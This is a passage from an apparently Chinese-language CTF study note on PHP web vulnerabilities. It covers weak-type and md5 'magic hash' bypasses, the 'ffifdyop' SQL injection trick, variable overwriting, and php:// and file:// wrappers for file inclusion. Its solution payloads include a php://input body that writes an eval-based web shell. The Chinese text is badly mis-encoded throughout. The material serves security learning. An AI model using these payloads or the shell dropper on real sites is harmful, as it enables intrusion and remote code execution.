//$test=1(int) å¼€å¤´éƒ¨åˆ†æ˜¯ä¸åˆæ³•çš„æ•°å€¼ï¼Œå­—ç¬¦ä¸² è½¬ æ•´å‹05 $test=1+&quot;2admin&quot;; //$test=3(int)6 $test=1+&quot;admin2&quot;; //$test=1(int)7 ?&gt; **===**ï¼šé¦–å…ˆåˆ¤æ–­äºŒè€… ç±»å‹æ˜¯å¦ç›¸åŒï¼Œè‹¥ä¸åŒç›´æ¥ä¸º0ï¼Œè‹¥ç±»å‹ç›¸åŒï¼Œå†æ¯”è¾ƒæ•°å€¼ 123456789101112131415161718&lt;?phpvar_dump(a===0); //falsevar_dump(1===1); //truevar_dump(&#x27;qw&#x27;===1); //false//æ³¨æ„ï¼švar_dump(&#x27;000&#x27;===0); //falsevar_dump(&#x27;a&#x27;===a); //truevar_dump(&#x27;1&#x27;===1); //falsevar_dump(&quot;QNKCDZO&quot; !== &quot;s878926199a&quot;);//truevar_dump(md5(&quot;QNKCDZO&quot;) === md5(&quot;s878926199a&quot;));//falsevar_dump(&quot;0e830400451993494058024219903391&quot; === &quot;0e545993274517709034328855841020&quot;);//falsevar_dump(&quot;0&quot; === 0);///falsevar_dump(&quot;01a&quot; === 0);//false ?&gt; å¦‚æœä¸€ä¸ªæ•°å€¼å’Œä¸€ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œé‚£ä¹ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å€¼ 123456789â€˜â€™ == 0 == false&#x27;123&#x27; == 123&#x27;abc&#x27; == 0&#x27;123a&#x27; == 123 &#x27;0x01&#x27; == 1&#x27;0e123456789&#x27; == &#x27;0e987654321&#x27; [false] == [0] == [NULL] == [&#x27;&#x27;]NULL == false == 0true == 1 å¦‚æœ switchæ˜¯æ•°å­—ç±»å‹çš„caseåˆ¤æ–­æ—¶ï¼Œswitchä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸ºintç±»å‹ 123456789101112131415&lt;?phphighlight_file(__FILE__);$i = &quot;3name&quot;;switch($i)&#123; case 0: case 1: case 2: echo &quot;two&quot;; break; case 3: echo &quot;flag&quot;; break;&#125;?&gt;æœ€ç»ˆçš„ç»“æœæ˜¯ flag strcmp()é—®é¢˜ï¼šæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œstrcmp(string $tr1,string $str2)å‡½æ•°æ˜¯å°†ä¸¤ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆAsciiä¹‹åå»è¿›è¡Œæ¯”è¾ƒçš„ï¼Œç›¸åŒä¸º1ï¼Œä¸åŒä¸º0ï¼Œè‹¥string1 &gt; string2ï¼Œè¿”å›&gt; 0ï¼›è‹¥string1 &lt; string2ï¼Œè¿”å›&lt; 0;è‹¥string1 = string2ï¼Œè¿”å›0 strcasecmp(string1, string2)ï¼šæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒºåˆ†å¤§å°å†™ è¿™ä¸¤ä¸ªå‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå½“å‡ºç°æ•°ç»„æ—¶ï¼Œè¿”å›nullã€‚(ä¸‹ä¾‹ä¸­@è¡¨ç¤ºå¿½ç•¥è­¦å‘Š) 12345678910&lt;?phpvar_dump(@strcmp([],&#x27;asd&#x27;)==0); //truevar_dump(@strcmp([],&#x27;asd&#x27;)===0); //falsevar_dump(strcmp(NULL,&#x27;asd&#x27;)==0); //falsevar_dump(@strcmp([],&#x27;asd&#x27;)); //NULLvar_dump(@strcmp([],123)); //NULLif(NULL==0)&#123; echo &quot;123&quot;; //123&#125;?&gt; is_numeric() å‡½æ•°ï¼šåˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—ï¼Œæ˜¯æ•°å­—è¿”å›1ï¼Œå¦åˆ™è¿”å›0 1234567891011echo is_numeric(1); //1echo is_numeric(&#x27;1&#x27;); //1echo is_numeric(0x1); //1echo is_numeric(&#x27;0x1&#x27;); //1var_dump(is_numeric([123])); //falsevar_dump(is_numeric(&#x27;123&#x27;)); //truevar_dump(is_numeric(&#x27;0x1&#x27;)); //bool(true)var_dump(is_numeric(&#x27;1a&#x27;)); //bool(false)var_dump(is_numeric([1])); //bool(false)echo is_numeric(&#x27;0e1&#x27;); //1var_dump(is_numeric(&#x27;0ea&#x27;)); //bool(false) in_array() é—®é¢˜ï¼šin_array(search,array,type)ï¼Œè¿”å› bool array_search() é—®é¢˜ï¼šåœ¨æ•°ç»„ä¸­æœç´¢æŸä¸ªé”®å€¼ï¼Œå¹¶è¿”å›å¯¹åº”çš„é”®å 12345678åœ¨æ•°ç»„ä¸­æœç´¢é”®å€¼ &quot;red&quot;ï¼Œå¹¶è¿”å›å®ƒçš„é”®åï¼š&lt;?php$a=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;,&quot;c&quot;=&gt;&quot;blue&quot;);echo array_search(&quot;red&quot;,$a); //è¾“å‡ºçš„æ˜¯ aif(array_search(&quot;red&quot;,$a)==a)&#123; echo &quot;success&quot;; //å°†ä¼šè¾“å‡º success&#125;?&gt; ä¾‹é¢˜ï¼š 1234567891011121314151617181920212223&lt;?phphighlight_file(__FILE__);$flag = &quot;flag&#123;qwewqeqwd&#125;&quot;;if(!is_array($_GET[&#x27;test&#x27;]))&#123; exit();&#125;$test = $_GET[&#x27;test&#x27;];for($i = 0;$i &lt; count($test);$i++)&#123; if($test[$i]===&#x27;admin&#x27;)&#123; echo &quot;error&quot;; exit(); &#125; $test[$i] = intval($test[$i]);&#125; if(array_search(&#x27;admin&#x27;,$test)===0)&#123; echo $flag;&#125;else&#123; echo &quot;false&quot;;&#125;?&gt; åˆ†æï¼š=== ä¸º 0 ï¼Œæœ€ç®€å•çš„åŠæ³•å°±æ˜¯ï¼Œä¸¤è¾¹ç±»å‹ä¸ç›¸åŒ WPï¼š?test[]=0 æˆ– ?test[0]=0 strpos() é—®é¢˜ï¼šstrpos(string,find,start)è¿”å›ä» startå¼€å§‹ï¼Œstringä¸­ findç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä½ç½®æ˜¯ä»0å¼€å§‹çš„ 12var_dump(strpos(&#x27;abcd&#x27;,&#x27;a&#x27;)); //int(0) bool(true) var_dump(strpos(&#x27;abcd&#x27;,&#x27;a&#x27;)===0); //bool(true) æ•°ç»„æ¯”è¾ƒï¼šphpæ‰‹å†Œä¸­å†™é“ï¼Œå½“æ•°ç»„(array)ä¸ä»»ä½•éæ•°ç»„è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œæ•°ç»„æ€»æ˜¯æœ€å¤§çš„ 1234var_dump([]&gt;0); //bool(true)var_dump([]&gt;9999); //bool(true)var_dump([]&gt;&#x27;a&#x27;); //bool(true) #æ•°ç»„å¤§äºå­—ç¬¦ä¸²var_dump([[]]&gt;[]); //bool(true) #è‡ªç„¶äºŒä½æ•°ç»„å¤§äºä¸€ç»´æ•°ç»„ boolç±»å‹çš„trueæ¯”è¾ƒï¼šboolç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦å¯ä»¥å¼±ç±»å‹ç›¸ç­‰ 1var_dump(true == &#x27;a&#x27;); //bool(true) **md5() ä¸ sha1()**ï¼šmd5(string,raw) md5 å’Œ sha1 æ— æ³•å¤„ç†æ•°ç»„ï¼Œä½†æ˜¯ php æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œç›´æ¥è¿”å› fasle 12sha1([]) === falsemd5([]) === false md5 ç»•è¿‡ == ï¼šç”±äºmd5å€¼å¼€å¤´å‡ä¸º 0e çš„æ•°æˆ–å­—ç¬¦ä¸²ï¼Œå¯¹ == æ¥è¯´æ˜¯ç›¸åŒçš„ï¼ˆéƒ½æ˜¯0ï¼‰ï¼›å¯¹===æ¥è¯´ï¼Œç±»å‹ä¸åŒåˆ™ä¸åŒã€‚md5 å€¼æ˜¯ 0e å¼€å¤´çš„æ€»ç»“ **md5 ç»•è¿‡ ===**ï¼šç”±äºmd5()å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œæ‰€ä»¥åœ¨md5()é‡åˆ°æ•°ç»„æ—¶ä¼šè­¦å‘Šå¹¶ä¸”è¿”å›nullï¼Œç„¶è€Œå¯ä»¥å¿½ç•¥è­¦å‘Šå¹¶é€šè¿‡æ•°ç»„ç»•è¿‡=== 123var_dump(@md5([]) == @md5([])) //bool(true)var_dump(@md5([]) === @md5([])) //bool(true)ï¼Œ@è¡¨ç¤ºå¿½ç•¥è­¦å‘Švar_dump(null === null); //bool(true) md5 ç»•è¿‡ sql ï¼šmd5 å’Œ sha1 æ”¯æŒç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦‚æœä¸º trueï¼Œåˆ™ä¼šå°† hash åçš„ 16 è¿›åˆ¶å­—ç¬¦ä¸²ä»¥ 16 è¿›åˆ¶è½¬æˆå­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ï¼Œå¦‚æœåœ¨ SQL è¯­å¥ä¸­è¿™æ ·å†™ï¼Œä¼šå­˜åœ¨æ³¨å…¥çš„é—®é¢˜ã€‚ 1234567æä¾›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼šffifdyopï¼Œmd5åï¼Œ276f722736c95d99e921722cf9ed621cå†è½¬æˆå­—ç¬¦ä¸²ï¼š&#x27;or&#x27;6Ã‰]â„¢Ã©!r,Ã¹Ã­bï¼Œå³md5(&#x27;ffifdyop&#x27;,true) =&#x27;or&#x27;6Ã‰]â„¢Ã©!r,Ã¹Ã­b // å¯ä»¥å®ç°ç»•è¿‡ $password = &quot;ffifdyop&quot;; $sql = &quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;; var_dump($sql); **sha1()**ï¼šåˆ—å‡º sha1() å¼€å¤´æ˜¯ 0eçš„å­—ç¬¦ä¸² 1234sha1(&#x27;aaroZmOk&#x27;) //0e66507019969427134894567494305185566735sha1(&#x27;aaK1STfY&#x27;) //0e76658526655756207688271159624026011393sha1(&#x27;aaO8zKZF&#x27;) //0e89257456677279068558073954252716165668sha1(&#x27;aa3OFF9m&#x27;) //0e36977786278517984959260394024281014729 preg_match() è¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸º**preg_match()åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ã€‚preg_match_all()ä¸åŒäºæ­¤ï¼Œå®ƒä¼šä¸€ç›´æœç´¢subject ç›´åˆ°åˆ°è¾¾ç»“å°¾ã€‚ å¦‚æœå‘ç”Ÿé”™è¯¯preg_match()**è¿”å› **false**ã€‚ 1234567891011121314include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125;#WP:?num[]=1#å½“ä¸æŒ‰ç…§æ­£ç¡®çš„æ–¹å¼ä¼ å‚æ•°æ—¶ï¼Œå°†ä¼šè®¤ä¸ºæ˜¯é”™è¯¯ï¼Œè€Œè‡ªåŠ¨è·³è¿‡æ­£åˆ™çš„æ£€æŸ¥ 1.2 PHP å˜é‡è¦†ç›–å˜é‡è¦†ç›–å‚è€ƒ extract() å‡½æ•°ï¼šextract() å‡½æ•° EXTR_OVERWRITE â€‹ å¦‚æœæœ‰å†²çªï¼Œè¦†ç›–å·²æœ‰çš„å˜é‡ EXTR_PREFIX_SAME â€‹ å¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ EXTR_SKIP â€‹ å¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ 123456789&lt;?php$size = &quot;large&quot;;$var_array = array(&quot;color&quot; =&gt; &quot;blue&quot;, &quot;size&quot; =&gt; &quot;medium&quot;, &quot;shape&quot; =&gt; &quot;sphere&quot;);extract($var_array, EXTR_PREFIX_SAME, &quot;wddx&quot;);echo &quot;$color, $size, $shape, $wddx_size\\n&quot;;?&gt; //å°†ä¼šè¾“å‡º blue, large, sphere, mediumï¼Œå³æ²¡æœ‰è¦†ç›–æ‰å˜é‡$size 123456789&lt;?php$size = &quot;large&quot;;$var_array = array(&quot;color&quot; =&gt; &quot;blue&quot;, &quot;size&quot; =&gt; &quot;medium&quot;, &quot;shape&quot; =&gt; &quot;sphere&quot;);extract($var_array, EXTR_OVERWRITE);echo &quot;$color, $size, $shape\\n&quot;;?&gt; //å°†ä¼šè¾“å‡º blue, medium, sphereï¼Œå·²ç»è¦†ç›–æ‰äº†$size é‚£ä¹ˆå½“ä»¥ä¸Šæƒ…å†µä»¥ extract($_GET) çš„å½¢å¼å‡ºç°æ—¶ï¼Œå°±æ„å‘³ç€ç”¨æˆ·å¯ä»¥ç›´æ¥è¦†ç›–æ‰å˜é‡äº†ã€‚ **trim(string,charlist)**ï¼šç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ 123456è§£é‡Šï¼šç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„å­—ç¬¦ï¼ˆ&quot;Hello&quot; ä¸­çš„ &quot;He&quot; ä»¥åŠ &quot;World&quot; ä¸­çš„ &quot;d!&quot;ï¼‰ï¼š&lt;?php$str = &quot;Hello World!&quot;;echo $str . &quot;&lt;br&gt;&quot;;echo trim($str,&quot;Hed!&quot;);?&gt; 123ç›¸å…³å‡½æ•°ï¼š ltrim() - ç§»é™¤å­—ç¬¦ä¸²å·¦ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ rtrim() - ç§»é™¤å­—ç¬¦ä¸²å³ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ 12345678å¦‚æœcharlistä¸å†™ï¼šé»˜è®¤ç§»é™¤ &quot; &quot; (ASCII 32 (0x20))ï¼Œæ™®é€šç©ºæ ¼ç¬¦ã€‚ &quot;\\t&quot; (ASCII 9 (0x09))ï¼Œåˆ¶è¡¨ç¬¦ã€‚ &quot;\\n&quot; (ASCII 10 (0x0A))ï¼Œæ¢è¡Œç¬¦ã€‚ &quot;\\r&quot; (ASCII 13 (0x0D))ï¼Œå›è½¦ç¬¦ã€‚ &quot;\\0&quot; (ASCII 0 (0x00))ï¼Œç©ºå­—èŠ‚ç¬¦ã€‚ &quot;\\x0B&quot; (ASCII 11 (0x0B))ï¼Œå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ foreach() éå†æ•°ç»„ï¼š 12345678&lt;?php $name = &quot;aaa&quot;;//ä¼ å‚ ?name=bbb foreach($_GET as $key =&gt; $val)&#123; $$key = $val; //å°†å˜æˆ $name = bbb &#125; var_dump($name); //è¿™æ ·ç›¸å½“äºå°†ä¸Šé¢çš„$nameçš„å€¼é€šè¿‡æˆ‘ä»¬çš„GETä¼ å‚è¿›è¡Œäº†ä¿®æ”¹?&gt; ä¾‹é¢˜ï¼š 1234567891011121314151617181920212223&lt;?php$flag = &quot;flag&#123;nishizuibangde!&#125;&quot;;highlight_file(__FILE__);$_403 = &quot;Access Denied&quot;;$_200 = &quot;Welcome Admin&quot;;if($_SERVER[&#x27;REQUEST_METHOD&#x27;] != &quot;POST&quot;)&#123; die();&#125;if(!isset($_POST[&#x27;flag&#x27;]))&#123; die($_403);&#125;foreach($_GET as $key =&gt; $value)&#123; $$key = $$value;&#125;foreach($_POST as $key =&gt; $value)&#123; $$key = $value;&#125;if($_POST[&#x27;flag&#x27;] !== $flag)&#123; die($_200);&#125;echo $flag;?&gt; **parse_str()**ï¼šå°†æŸ¥è¯¢çš„å­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œå¦‚æœæœªè®¾ç½®arrayå‚æ•°ï¼Œç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚ 12345678è§£é‡Šï¼šå°†æŸ¥è¯¢çš„å­—ç¬¦ä¸²è§£æä¸ºå˜é‡&lt;?phpparse_str(&quot;name=Bill&amp;age=60&quot;);echo $name.&quot;&lt;br&gt;&quot;;echo $age;?&gt; //è¾“å‡ºï¼š Bill // 60 ä¾‹é¢˜ï¼š 1234567891011121314151617&lt;?php//highlight_file(__FILE__);if(empty($_GET[&#x27;id&#x27;]))&#123; show_source(__FILE__); die();&#125;else&#123; $a = &#x27;www.baidu.com&#x27;; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;))&#123; echo &quot;success&quot;; &#125;else&#123; exit(&#x27;false&#x27;); &#125;&#125;?&gt; //WP:?id=a[0]=240610708 æ‰¾md5çš„å€¼æ˜¯ ç§‘å­¦æŠ€æœ¯æ³• 0eå¼€å¤´çš„ï¼Œæ ¹æ® PHPå¼±ç±»å‹çš„æ¯”è¾ƒï¼Œ0eå¼€å¤´å‡ä¸º0 md5 å€¼æ˜¯ 0e å¼€å¤´çš„ **import_request_variables()**ï¼šå¯ä»¥åœ¨ register_global = off æ—¶ï¼ŒæŠŠ GET/POST/Cookie å˜é‡å¯¼å…¥å…¨å±€ä½œç”¨åŸŸä¸­ ç‰ˆæœ¬è¦æ±‚ï¼šPHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0 ä¾‹é¢˜ï¼š 1234567891011&lt;?phphighlight_file(__FILE__);$auth = &#x27;0&#x27;;import_request_variables(&#x27;G&#x27;);if($auth == 1)&#123; echo &quot;success&quot;;&#125;else&#123; echo &quot;false&quot;;?&gt; //è¾“å…¥ ?auth=1 //import_request_variables(&#x27;G&#x27;)æŒ‡å®šå¯¼å…¥GETè¯·æ±‚ä¸­çš„å˜é‡ï¼Œä»è€Œå¯¼è‡´å˜é‡è¦†ç›– å…¨å±€å˜é‡æ³¨å†Œå¼€å…³é—®é¢˜ï¼šregister_globals=On/Offï¼Œå½“æ˜¯Onçš„æ—¶å€™ï¼Œä¼ é€’è¿‡æ¥çš„å€¼ä¼šè¢«ç›´æ¥æ³¨å†Œä¸º å…¨å±€å˜é‡ ç›´æ¥ä½¿ç”¨ å‚è€ƒä¸€ ini_get() : è·å–ä¸€ä¸ªé…ç½®é€‰é¡¹çš„å€¼ ä¾‹ä¸€ï¼š 123456&lt;?php //?id=1echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; echo &#x27;$_GET[&quot;id&quot;] :&#x27;.$_GET[&#x27;id&#x27;].&quot;&lt;br/&gt;&quot;;echo &#x27;$id :&#x27;.$id;?&gt; ä¾‹äºŒï¼š 12345678&lt;?php echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; if (ini_get(&#x27;register_globals&#x27;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;); print $a.&quot;&lt;br/&gt;&quot;; print $_GET[b]; ?&gt; //?GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2 å³å¯è¦†ç›– 12345678910 &lt;?php highlight_file(__FILE__); echo &quot;Register_globals:&quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; if (ini_get(&#x27;register_globals&#x27;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;); echo $a; echo &quot;&lt;br /&gt;&quot;;echo $_GET[b]; ?&gt; //è¾“å…¥ ?a=1&amp;b=2 unset($&#123;$k&#125;)çš„å­˜åœ¨ï¼Œæ— æ³•è¦†ç›– //è¾“å…¥ ?GLOBALS[a]=1&amp;b=2 ä½¿ç”¨å…¨å±€å˜é‡ï¼Œå³å¯è¦†ç›– 1.3 æ‰§è¡Œå‘½ä»¤ **system()**ï¼šåœ¨æ‰§è¡Œå¤–éƒ¨å‘½ä»¤æ—¶ï¼Œç›´æ¥å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨ï¼Œä¸éœ€è¦ä½¿ç”¨echoæˆ–returnæ¥æŸ¥çœ‹ç»“æœï¼Œ **passthru()**ï¼šç›´æ¥å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨ï¼Œä¸éœ€è¦ä½¿ç”¨ echo æˆ– return æ¥æŸ¥çœ‹ç»“æœï¼Œä¸è¿”å›ä»»ä½•å€¼ï¼Œä¸”å…¶å¯ä»¥è¾“å‡ºäºŒè¿›åˆ¶ï¼Œæ¯”å¦‚å›¾åƒæ•°æ®ã€‚ **exec()**ï¼šæ‰§è¡Œç³»ç»Ÿå¤–éƒ¨å‘½ä»¤æ—¶ä¸ä¼šè¾“å‡ºç»“æœï¼Œè€Œæ˜¯è¿”å›ç»“æœçš„æœ€åä¸€è¡Œï¼Œéœ€è¦ä½¿ç”¨echoç­‰å‡½æ•°è¿›è¡Œè¾“å‡ºã€‚å¦‚æœä½ æƒ³å¾—åˆ°ç»“æœä½ å¯ä»¥ä½¿ç”¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œè®©å…¶è¾“å‡ºåˆ°æŒ‡å®šçš„æ•°ç»„ï¼Œæ­¤æ•°ç»„ä¸€ä¸ªè®°å½•ä»£è¡¨è¾“å‡ºçš„ä¸€è¡Œï¼Œå³å¦‚æœè¾“å‡ºç»“æœæœ‰20è¡Œï¼Œåˆ™è¿™ä¸ªæ•°ç»„å°±æœ‰20æ¡è®°å½•ã€‚ 12345 &lt;?php echo exec(&quot;ping 127.0.0.1&quot;,$file); echo &quot;&lt;/br&gt;&quot;; print_r($file);?&gt; shell_exec() ä¸ åå¼•å· ï¼šshell_exec() å‡½æ•°å®é™…ä¸Šä»…æ˜¯åå¼•å·()æ“ä½œç¬¦çš„å˜ä½“ï¼Œéƒ½ä¸ä¼šè¾“å‡ºç»“æœï¼Œéœ€è¦ä½¿ç”¨echoç­‰å‡½æ•°æ‰“å°å‡ºç»“æœã€‚ äºŒã€PHP ä¼ªåè®®PHP ä¼ªåè®® å‚è€ƒä¸€ PHP ä¼ªåè®® å‚è€ƒäºŒ PHPä¼ªåè®®äº‹å®ä¸Šå°±æ˜¯æ”¯æŒçš„åè®®ä¸å°è£…åè®® php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ è¯´æ˜ï¼š PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ã€å†…å­˜ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„ è¿‡æ»¤å™¨ã€‚ 12php://filter/read=convert.base64-encode/resource=index.phpphp://filter/read=string.rot13/resource=index.php 2.1 php://filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ å‚æ•°ï¼š ä½¿ç”¨ï¼š 123php://filter/resource=&lt;å¾…è¿‡æ»¤çš„æ•°æ®æµ&gt;php://filter/read=&lt;è¯» é“¾éœ€è¦åº”ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨&gt;php://filter/write=&lt;å†™ é“¾éœ€è¦åº”ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨&gt; #å¯é‡‡ç”¨ä¸€ä¸ªæˆ–ä»¥ç®¡é“ç¬¦ | åˆ†éš”çš„å¤šä¸ªè¿‡æ»¤å™¨åç§° ç¤ºä¾‹ï¼š file_get_contents â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸² file_put_contents â€” å°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ 12345678&lt;?phphighlight_file(__FILE__);$file1 = $_GET[&#x27;file1&#x27;]; $file2 = $_GET[&#x27;file2&#x27;]; $txt = $_GET[&#x27;txt&#x27;]; echo file_get_contents($file1); file_put_contents($file2,$txt); ?&gt; åˆ©ç”¨ï¼š 12345678# è·å–æ–‡ä»¶file1=php://filter/resource=file.txt #æ˜æ–‡file1=php://filter/read=convert.base64-encode/resource=file.txt #å¯†æ–‡file1=php://filter/read=string.rot13/resource=file.txt# å†™å…¥æ–‡ä»¶?file2=php://filter/resource=test.txt&amp;txt=helloworld #æ˜æ–‡file2=php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=helloworld #å¯†æ–‡ 2.2 php://input php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ enctype=&quot;multipart/form-data&quot; çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ 1234?path=php://input&lt;POST éƒ¨åˆ†&gt; &lt;?php phpinfo();?&gt; &lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt; 2.3 file:// åè®®é€šå¸¸ç”¨æ¥ è¯»å–æœ¬åœ°æ–‡ä»¶ ï¼Œä¸”ä¸å—allow_url_fopenä¸allow_url_include çš„å½±å“ã€‚include()/require()/include_once()/require_once()å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œå¦‚å¯¼å…¥ä¸ºé.phpæ–‡ä»¶ï¼Œåˆ™ä»æŒ‰ç…§phpè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ˜¯include()å‡½æ•°æ‰€å†³å®šçš„ã€‚ æµ‹è¯•ï¼š 123456&lt;?php$path = $_GET[&#x27;path&#x27;];if(isset($_GET[&#x27;path&#x27;]))&#123; include(&quot;$path&quot;);&#125;?&gt; 1234# ç»å¯¹è·¯å¾„?path=file://D:\\phpstudy_pro\\WWW\\learn\\phpin.php?path=file://D:/phpstudy_pro/WWW/learn/phpin.php?path=file:///D:/phpstudy_pro/WWW/learn/phpin.php 2.4 http:// åè®®1?path=http://learn/phpin.php 2.5 php:// åè®®æ¡ä»¶ï¼š allow_url_fopen:off/on allow_url_include :ä»…php://input php://stdin php://memory php://temp éœ€è¦on åè®® ä½œç”¨ php://input å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„dataéƒ¨åˆ†ï¼Œåœ¨enctype=&quot;multipart/form-data&quot; çš„æ—¶å€™php://input æ˜¯æ— æ•ˆçš„ã€‚ php://output åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚ php://fd (&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ php://fd/3 å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚ php://memory php://temp (&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ php://memory æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ php://temp ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ sys_get_temp_dir() çš„æ–¹å¼ä¸€è‡´ã€‚ php://filter (&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚ 2.6 zip:// bzip2:// zlib:// åè®®ip:// bzip2:// zlib:// åè®® æ¡ä»¶ï¼š allow_url_fopen:off/on allow_url_include :off/on ä½œç”¨ï¼šzip:// &amp; bzip2:// &amp; zlib:// 